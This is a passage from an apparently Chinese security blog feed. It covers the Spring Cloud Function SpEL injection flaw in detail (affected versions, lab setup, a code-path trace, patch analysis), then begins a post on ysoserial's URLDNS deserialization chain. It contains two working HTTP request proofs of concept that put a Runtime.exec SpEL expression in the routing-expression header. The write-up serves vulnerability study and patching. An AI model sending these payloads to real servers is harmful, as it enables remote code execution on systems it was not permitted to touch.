&lt;h3 id=&quot;什么是SpEL表达式&quot;&gt;&lt;a href=&quot;#什么是SpEL表达式&quot; class=&quot;headerlink&quot; title=&quot;什么是SpEL表达式&quot;&gt;&lt;/a&gt;什么是SpEL表达式&lt;/h3&gt;&lt;p&gt;Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。&lt;br&gt; Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="注入" scheme="https://kpa1on.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Spring Cloud Function SpEL漏洞分析及复现</title>
    <link href="https://kpa1on.github.io/2022/03/29/Spring%20Cloud%20Function%20SpEL%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <id>https://kpa1on.github.io/2022/03/29/Spring%20Cloud%20Function%20SpEL%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-29T01:56:43.000Z</published>
    <updated>2022-04-26T05:04:47.773Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h3><p>当<code>Spring Cloud Function</code> 启用动态路由<code>functionRouter</code>时，由于<code>Spring Cloud  Function</code>中<code>RoutingFunction</code>类的apply方法将请求头中的<code>spring.cloud.function.routing-expression</code>参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。</p><span id="more"></span><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>官方的环境（需要修改pom.xml）：</p><p><a href="https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo">https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo</a></p><p>cckuailong师傅创建的环境（需要jdk17）：</p><p><a href="https://github.com/cckuailong/spring-cloud-function-SpEL-RCE">https://github.com/cckuailong/spring-cloud-function-SpEL-RCE</a></p><p>jwwam师傅的环境（可以jdk8，需要修改pom.xml）：</p><p><a href="https://github.com/jwwam/scfunc">https://github.com/jwwam/scfunc</a></p><p>或者下载jar包运行（需要jdk11）：「SpringCloud-Function-0.0.1-SNAPSHOT.jar」<a href="https://www.aliyundrive.com/s/m8evrX31CkU">https://www.aliyundrive.com/s/m8evrX31CkU</a></p><p>修改pom.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line"> xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line"> xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">&lt;groupId&gt;io.spring.sample&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;function-sample-pojo&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.2.1.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">&lt;name&gt;function-sample-pojo&lt;/name&gt;</span><br><span class="line">&lt;description&gt;Spring Cloud Function Web Support&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;parent&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.0.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;relativePath/&gt;</span><br><span class="line">&lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">&lt;properties&gt;</span><br><span class="line">&lt;spring-cloud-function.version&gt;3.2.1-SNAPSHOT&lt;/spring-cloud-function.version&gt;</span><br><span class="line">&lt;wrapper.version&gt;1.0.27.RELEASE&lt;/wrapper.version&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-cloud-starter-function-webflux&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;</span><br><span class="line">&lt;optional&gt;true&lt;/optional&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-cloud-function-dependencies&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;$&#123;spring-cloud-function.version&#125;&lt;/version&gt;</span><br><span class="line">&lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">&lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"></span><br><span class="line">&lt;build&gt;</span><br><span class="line">&lt;plugins&gt;</span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;skip&gt;true&lt;/skip&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.springframework.boot.experimental&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;spring-boot-thin-layout&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;$&#123;wrapper.version&#125;&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">&lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;includes&gt;</span><br><span class="line">&lt;include&gt;**/*Tests.java&lt;/include&gt;</span><br><span class="line">&lt;include&gt;**/*Test.java&lt;/include&gt;</span><br><span class="line">&lt;/includes&gt;</span><br><span class="line">&lt;excludes&gt;</span><br><span class="line">&lt;exclude&gt;**/Abstract*.java&lt;/exclude&gt;</span><br><span class="line">&lt;/excludes&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br><span class="line">&lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>拉取仓库后用IDEA maven进行打包调试即可。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p><p>可以看到官方给的测试用例如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330010520987-258020339.png" alt="image-20220330010520323"></p><p>有个核心的地方就是设置一个请求头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setHeader(FunctionProperties.PREFIX + &quot;.routing-expression&quot;,&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a calculator.app\&quot;)&quot;)</span><br></pre></td></tr></table></figure><p>请求头中的<code>FunctionProperties.PREFIX</code>为<code>spring.cloud.function</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330011359605-1752898534.png" alt="image-20220330011359150"></p><p>所以拼接起来，漏洞的利用是在请求的headers头上添加一个<code>spring.cloud.function.routing-expression</code>参数，然后会将其参数内容直接带入到SPEL中查询，造成SpEL漏洞注入。</p><p>POC1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330014710976-2126231147.png" alt="image-20220330014710218"></p><p>application.properties</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330111652281-1882515346.png" alt="image-20220330111652398"></p><p>POC2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>application.properties</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330111716617-918890702.png" alt="image-20220330111716779"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞是出在<code>SpringCloud  Function</code>的<code>RoutingFunction</code>功能上，其功能的目的本身就是为了微服务应运而生的，可以直接通过HTTP请求与单个的函数进行交互，同时为<code>spring.cloud.function.definition</code>参数提供您要调用的函数的名称。</p><p>比如我们可以自定义一个函数，这里随意编写一个反转函数用来测试</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330020451902-1074931253.png" alt="image-20220330020451543"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@Bean    //第一个String代表输入类型，第二个String代表输出类型</span><br><span class="line">public Function&lt;String, String&gt; reverseString() &#123;</span><br><span class="line">return value -&gt; new StringBuilder(value).reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在请求头中添加<code>spring.cloud.function.definition:</code> 函数名即可调用我们的函数</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330020325403-559736302.png" alt="image-20220330020324910"></p><p>下面分析漏洞利用的过程</p><h4 id="第1种利用：需要修改配置-任意路由"><a href="#第1种利用：需要修改配置-任意路由" class="headerlink" title="第1种利用：需要修改配置+任意路由"></a>第1种利用：需要修改配置+任意路由</h4><p>首先我们在漏洞利用的时候是先发起一个post请求的，因此，我们可以先查看后端的Controller层对提交的请求做了哪些操作</p><p>定位到控制层代码<code>org\springframework\cloud\function\web\mvc\FunctionController.java#post</code>方法，在此处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330021314819-442313903.png" alt="image-20220330021314391"></p><p>点击调试按钮，burp发送poc</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330021659096-81060508.png" alt="image-20220330021658671"></p><p>此时停在了断点处，可以在Variables视图看到<code>spring.cloud.function.routing-expression</code>头的赋值情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServletWebRequest-&gt;HttpServletRequest-&gt;Request-&gt;MimeHeaders-&gt;headers-&gt;spring.cloud.function.routing-expression</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330022344967-1509764902.png" alt="image-20220330022344082"></p><p>往下，程序会获取body中的参数，并传入processRequest方法中，在processRequest方法中会获取通过wrapper对象获取到请求头，并将请求体和请求头封装成inputMessage，接着调用<code>FunctionInvocationWrapper#isRoutingFunction</code>方法判断当前请求是否为RoutingFunction。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330024427531-1408829946.png" alt="image-20220330024426871"></p><p>接着往下，通过<code>FunctionInvocationWrapper#apply</code>方法将请求的内容和Header头封装成的input带入到<code>FunctionInvocationWrapper.apply</code>方法中，随后又进入其中的doApply方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330024926370-1410073270.png" alt="image-20220330024925921"></p><p>在doApply方法中，会判断当前的RoutingFunction和Composed是否为true，如果是，则调用<code>RoutingFunction</code>的apply方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330025516556-343128977.png" alt="image-20220330025515539"></p><p>跟进apply方法，发现其调用了<code>RoutingFunction#route</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330030219026-1186212549.png" alt="image-20220330030218623"></p><p>跟进route方法，if判断中，获取header请求头中的字段，判断是否存在<code>spring.cloud.function.definition</code>，若不存在则判断是否存在<code>spring.cloud.function.routing-expression</code>，如存在则调用<code>functionFromExpression</code>方法解析对应的值。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330030845396-1989933020.png" alt="image-20220330030844758"></p><p>进入<code>functionFromExpression</code>方法中，可以看到通过<code>SpelExpressionParser</code>来解析内容，导致Spel表达式注入。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330031309339-1389221856.png" alt="image-20220330031308676"></p><p>这里可以看到设置<code>EvaluationContext</code>的值是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330031817613-1636925655.png" alt="image-20220330031816947"></p><p>如下，evalContext对象创建采用的是<code>StandardEvaluationContext</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330031931608-303862117.png" alt="image-20220330031931303"></p><h4 id="第2种利用：默认配置-特定路由"><a href="#第2种利用：默认配置-特定路由" class="headerlink" title="第2种利用：默认配置+特定路由"></a>第2种利用：默认配置+特定路由</h4><p>定位到<code>FunctionHandlerMapping.java#HandlerMethod</code>方法，方法中会获取请求的路径，然后调用<code>findFunction</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330113254208-1412992217.png" alt="image-20220330113254178"></p><p>接着跟进<code>doFindFunction</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330113801841-816435868.png" alt="image-20220330113801926"></p><p>后调用<code>FunctionCatalog#lookup</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114045130-2137151268.png" alt="image-20220330114045221"></p><p>继续跟进lookup方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114158324-1902508255.png" alt="image-20220330114158564"></p><p>又调用dolookup方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114259775-395682282.png" alt="image-20220330114259887"></p><p>dolookup方法大概是在为function进行赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330114554904-1169967782.png" alt="image-20220330114554987"></p><p>返回function之后，往下走，在<code>discoverFunctionInBeanFactory</code>方法处，做了一个类似于查询的操作，查找bean工厂中是否有functionRouter，如果有就返回，这里可以看到返回了RoutingFunction对象（经过调试，如果这里没有查询到，后面就返回null，就不会结果post方法进行后续的调用，也就是不会触发SpEL表达式注入）</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330171823760-496272863.png" alt="image-20220330171824010"></p><p>最后调用父类的doLookup方法，返回function对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330172321169-1154231931.png" alt="image-20220330172321312"></p><p>返回之后，回到<code>FunctionWebRequestProcessingHelper.java</code>类调用<code>doFindFunction</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330172418160-1118719027.png" alt="image-20220330172418514"></p><p>继续往下就回到了<code>FunctionHandlerMapping.java#getHandlerInternal</code>方法，将function保存到request的作用域中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330172639513-1230584586.png" alt="image-20220330172639853"></p><p>最后经过一连串的F8，就到了熟悉的post方法，后续的步骤就是一样的了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330173056936-17926663.png" alt="image-20220330173057185"></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>在补丁中，通过<code>SimpleEvaluationContext</code>来构建<code>EvalContext</code>对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330032522641-247909414.png" alt="image-20220330032522050"></p><p>在<code>functionFromExpression</code>函数中添加了一个boolean型的参数</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330033300387-1490197489.png" alt="image-20220330033300034"></p><p>根据传入的值为true，即调用<code>getValue(this.headerEvalContext, input, String.class)</code>，也就防止SpEL注入的发生。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220330033426315-574243917.png" alt="image-20220330033425927"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/wh4am1/p/16062306.html">https://www.cnblogs.com/wh4am1/p/16062306.html</a></p><p><a href="https://mp.weixin.qq.com/s/O2vJmMgqrQp5RTLwvZ5X_w">https://mp.weixin.qq.com/s/O2vJmMgqrQp5RTLwvZ5X_w</a></p><p><a href="https://mp.weixin.qq.com/s/2gKqp3YJtZJ7MMtbkHhOBA">https://mp.weixin.qq.com/s/2gKqp3YJtZJ7MMtbkHhOBA</a></p><p><a href="https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg">https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;漏洞情况&quot;&gt;&lt;a href=&quot;#漏洞情况&quot; class=&quot;headerlink&quot; title=&quot;漏洞情况&quot;&gt;&lt;/a&gt;漏洞情况&lt;/h3&gt;&lt;p&gt;当&lt;code&gt;Spring Cloud Function&lt;/code&gt; 启用动态路由&lt;code&gt;functionRouter&lt;/code&gt;时，由于&lt;code&gt;Spring Cloud  Function&lt;/code&gt;中&lt;code&gt;RoutingFunction&lt;/code&gt;类的apply方法将请求头中的&lt;code&gt;spring.cloud.function.routing-expression&lt;/code&gt;参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SpEL" scheme="https://kpa1on.github.io/tags/SpEL/"/>
    
    <category term="漏洞复现" scheme="https://kpa1on.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之URLDNS链</title>
    <link href="https://kpa1on.github.io/2022/03/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE/"/>
    <id>https://kpa1on.github.io/2022/03/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE/</id>
    <published>2022-03-24T01:58:43.000Z</published>
    <updated>2022-03-25T03:10:07.440Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>URLDNS链是ysoserial里面的一条简单的利用链，但URLDNS的利用效果是只能触发一次DNS请求，而不能去执行命令，比较适用于漏洞验证这一块。而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。</p><span id="more"></span><h3 id="反序列化漏洞成因"><a href="#反序列化漏洞成因" class="headerlink" title="反序列化漏洞成因"></a>反序列化漏洞成因</h3><p>序列化指把Java对象转换为字节序列的过程，反序列化就是打开字节流并重构对象，那如果即将被反序列化的数据是特殊构造的，就可以产生非预期的对象，从而导致任意代码执行。</p><p>Java中间件通常通过网络接收客户端发送的序列化数据，而在服务端对序列化数据进行反序列化时，会调用被序列化对象的readObject( )方法。而在Java中如果重写了某个类的方法，就会优先调用经过修改后的方法。如果某个对象重写了readObject( )方法，且在方法中能够执行任意代码，那服务端在进行反序列时，也会执行相应代码。如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。</p><h3 id="动态调试ysoserial"><a href="#动态调试ysoserial" class="headerlink" title="动态调试ysoserial"></a>动态调试ysoserial</h3><p>ysoserial jar : <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-30099844c6-1/ysoserial-master-30099844c6-1.jar</a></p><p>ysoserial 源码：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>下载源码，导入到IDEA中，刷新maven，下载好依赖，查看pom.xml，搜索mainClass可以找到入口类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324121703771-324482593.png" alt="image-20220324121703214"></p><p>进入到<code>GeneratePayload</code>，配置启动参数</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324121753313-1166989604.png" alt="image-20220324121752642"></p><p>再次运行就可以了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324145147757-1761601805.png" alt="image-20220324145146854"></p><p>下面分析下ysoserial是怎么生成序列化数据的</p><p>随便下个断点进入<code>Utils.getPayloadClass</code>方法中，代码就简单利用反射获取到了<code>URLDNS</code>的Class对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324145800406-140123450.png" alt="image-20220324145759828"></p><p>往下走就进入<code>getObject()</code>方法中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150429981-1549459291.png" alt="image-20220324150429427"></p><p><code>getObject()</code>方法中，创建了一个<code>hashmap</code>，并将URL对象当做map的key值，value值随意，最后还通过反射修改了<code>hashCode</code>的值为-1，这里修改的原因后面分析。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150612449-2075497477.png" alt="image-20220324150611827"></p><p>继续往下，就是调用<code>serialize()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150953783-367568477.png" alt="image-20220324150953288"></p><p>进入，可以看到这里就是将上一步返回的HashMap进行序列化输出至控制台</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324151039351-180380922.png" alt="image-20220324151038792"></p><h3 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h3><p>打开<code>ysoserial\payloads\URLDNS.java</code>，在源码的注释中可以看到对调用链的描述，翻译过来就是</p><blockquote><p>Java URL 类在其 equals 和 hashCode 方法上有一个有趣的属性。作为副作用，URL 类将在比较期间进行 DNS 查找（equals 或 hashCode）。作为反序列化的一部分，HashMap 在它反序列化的每个键上调用 hashCode，因此使用 Java URL 对象作为序列化键可以触发 DNS 查找</p></blockquote><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324122318357-1620163897.png" alt="image-20220324122317730"></p><p>调用链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>具体的调用过程，我们下断点调试看看，先生成序列化数据</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324154308449-649122196.png" alt="image-20220324154308028"></p><p>简单写个反序列化入口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324154622357-1287485145.png" alt="image-20220324154621771"></p><p>触发DNS查询</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324154723880-915016525.png" alt="image-20220324154723458"></p><p>下面开始分析，根据上述的Gadget Chain，可见触发点是在<code>HashMap.readObject()</code>，来到<code>hashmap</code>的<code>readobject()</code>方法，然后一直F8，根据Gadget Chain发现使用了<code>putVal()</code>方法，但这不是重点，重点是会调用hash方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324163859435-892075761.png" alt="image-20220324163858671"></p><p>这里使用了hash方法对key的值进行了处理，我们来跟踪一下hash这个方法看看他具体的实现</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324163944218-1431329215.png" alt="image-20220324163943772"></p><p>如果key不是null就会调用<code>key.hashCode()</code>方法，跟进<code>hashCode()</code>方法，这里调用的是URL类中的<code>hashCode()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324164056332-755946695.png" alt="image-20220324164055912"></p><p>当<code>hashCode</code>值不为-1时就直接return，就不会触发<code>hashCode()</code>方法，也就不会触发接下来的DNS解析，这里<code>hashCode</code>值默认为 -1，所以会执行 